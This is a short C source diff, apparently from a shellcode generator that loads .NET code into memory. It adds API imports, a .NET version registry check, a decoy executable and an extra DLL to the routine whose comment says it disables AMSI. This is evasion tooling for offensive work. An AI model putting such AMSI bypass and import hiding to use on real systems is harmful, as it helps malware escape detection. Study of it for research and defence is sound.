@@ -44,6 +44,7 @@ static API_IMPORT api_imports[]=
 { {KERNEL32_DLL, "LoadLibraryA"},
   {KERNEL32_DLL, "GetProcAddress"},
   {KERNEL32_DLL, "GetModuleHandleA"},
+  {KERNEL32_DLL, "AllocConsole"},
   
   {KERNEL32_DLL, "VirtualAlloc"},
   {KERNEL32_DLL, "VirtualFree"},
@@ -70,6 +71,8 @@ static API_IMPORT api_imports[]=
   
   {MSCOREE_DLL,  "CorBindToRuntime"},
   {MSCOREE_DLL,  "CLRCreateInstance"},
+  
+  {SHLWAPI_DLL,  "SHGetValueA"},
   
   { NULL, NULL }
 };
@@ -376,15 +379,21 @@ static int CreateInstance(PDONUT_CONFIG c) {
     memcpy(&inst->xCLSID_CorRuntimeHost, &xCLSID_CorRuntimeHost, sizeof(GUID));
 
     // DLLs required to disable AMSI
-    strncpy(inst->amsi, "AMSI", 8);
-    strncpy(inst->clr,  "CLR",  8);
+    strcpy(inst->amsi,   "AMSI");
+    strcpy(inst->clr,    "CLR");
+    strcpy(inst->subkey, "SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full");
+    strcpy(inst->value,  "Release");
+    memcpy(inst->decoy,  hello_exe, sizeof(hello_exe));
+    
+    inst->decoy_len = hello_exe_len;
     
     DPRINT("Copying DLL strings to instance");
-    inst->dll_cnt = 3;
+    inst->dll_cnt = 4;
     
-    strncpy(inst->dll_name[0], "mscoree.dll", DONUT_MAX_NAME-1);
-    strncpy(inst->dll_name[1], "oleaut32.dll",DONUT_MAX_NAME-1);
-    strncpy(inst->dll_name[2], "wininet.dll" ,DONUT_MAX_NAME-1);
+    strcpy(inst->dll_name[0], "mscoree.dll");
+    strcpy(inst->dll_name[1], "oleaut32.dll");
+    strcpy(inst->dll_name[2], "wininet.dll");
+    strcpy(inst->dll_name[3], "shlwapi.dll");
 
     DPRINT("Generating hashes for API using IV: %" PRIx64, iv);
     inst->iv = iv;
